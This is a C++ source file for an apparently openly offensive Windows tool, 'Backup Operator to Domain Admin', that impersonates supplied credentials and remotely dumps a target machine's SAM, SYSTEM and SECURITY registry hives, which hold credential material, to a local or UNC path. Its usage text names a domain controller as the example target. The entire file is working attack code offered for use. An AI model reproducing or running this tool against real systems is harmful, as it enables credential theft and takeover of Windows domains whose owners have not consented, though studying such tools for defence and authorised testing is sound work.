// BackupOperatorToDA.cpp
// all code and credit from https://twitter.com/filip_dragovic
// https://raw.githubusercontent.com/Wh04m1001/Random/main/BackupOperators.cpp
// I just wanted to have a more generic binary with parameters etc

#include <stdio.h>
#include <iostream>
#include <Windows.h>

LPCSTR user = NULL;
LPCSTR password = NULL;
LPCSTR domain = NULL;
LPCSTR path = NULL;
LPCSTR target = NULL;

DWORD MakeToken();

DWORD MakeToken() {
	HANDLE token;

	//printf("%s\n", user);
	//printf("%s\n", password);
	//printf("%s\n", domain);

	if (LogonUserA(user, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &token) == 0) {
		printf("LogonUserA: %d\n", GetLastError());
		exit(0);
	}
	if (ImpersonateLoggedOnUser(token) == 0) {
		printf("ImpersonateLoggedOnUser: %d\n", GetLastError());
		exit(0);
	}
	return 0;
}

void exploit() {

	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives[] = { "SAM","SYSTEM","SECURITY" };

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		printf("RegConnectRegistryW: %d\n", result);
		exit(0);
	}
	for (int i = 0; i < 3; i++) {
		printf("Dumping %s hive to %s\n", hives[i], std::string(path).append(hives[i]).c_str());
		result = RegOpenKeyExA(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
		if (result != 0) {
			printf("RegOpenKeyExA: %d\n", result);
			exit(0);
		}
		result = RegSaveKeyA(hkey, std::string(path).append(hives[i]).c_str(), NULL);
		if (result != 0) {
			printf("RegSaveKeyA: %d\n", result);
			exit(0);
		}
	}
}

void PrintUsage()
{
	wprintf(
		L"\n"
		"Backup Operator to Domain Admin (by @mpgn_x64)\n"
		"\n"
		"  This tool exist thanks to @filip_dragovic / https://github.com/Wh04m1001 \n"
		"\n"
	);

	wprintf(
		L"Mandatory argument:\n"
		"  -t <TARGET>      \\\\computer_name (ex: \\\\dc01.pouldard.wizard\n"
		"  -o <PATH>        Where to store the sam / system / security files (can be UNC path)\n"
		"\n"
		"Optional arguments:\n"
		"\n"
		"  -u <USER>        Username\n"
		"  -p <PASSWORD>    Password\n"
		"  -d <DOMAIN>      Domain\n"
		"  -h               help\n"
		"\n"
	);
}

int main(int argc, char* argv[])
{
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'u':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				user = argv[1];
				// printf("user: %s\n", argv[1]);
			}
			else
			{
				printf("[-] Missing value for option: -u\n");
				PrintUsage();
				return -1;
			}
			break;
		case 'p':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				password = argv[1];
				// printf("password: %s\n", argv[1]);
			}
			else
			{
				printf("[-] Missing value for option: -p\n");
				PrintUsage();
				return -1;
			}
			break;
		case 'd':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				domain = argv[1];
				// printf("domain: %s\n", argv[1]);
			}
			else
			{
				printf("[-] Missing value for option: -d\n");
				PrintUsage();
				return -1;
			}
			break;
		case 'o':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				path = argv[1];
				// printf("path: %s\n", argv[1]);
			}
			else
			{
				printf("[-] Missing value for option: -o\n");
				PrintUsage();
				return -1;
			}
			break;
		case 't':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				target = argv[1];
				// printf("target: %s\n", argv[1]);
			}
			else
			{
				printf("[-] Missing value for option: -t\n");
				PrintUsage();
				return -1;
			}
			break;
		default:
			printf("[-] Invalid argument: %s\n", argv[1]);
			PrintUsage();
			return -1;
		}
		++argv;
		--argc;
	}
	if (target == NULL || path == NULL) {
		printf("[-] Missing argument -t or -o\n");
		exit(0);
	}
	if (target[0] != '\\') {
		printf("[-] Target should start with \\\\\n");
		exit(0);
	}

	if (domain && user && password) {
		printf("Making user token\n");
		MakeToken();
	}

	exploit();

	return 0;
}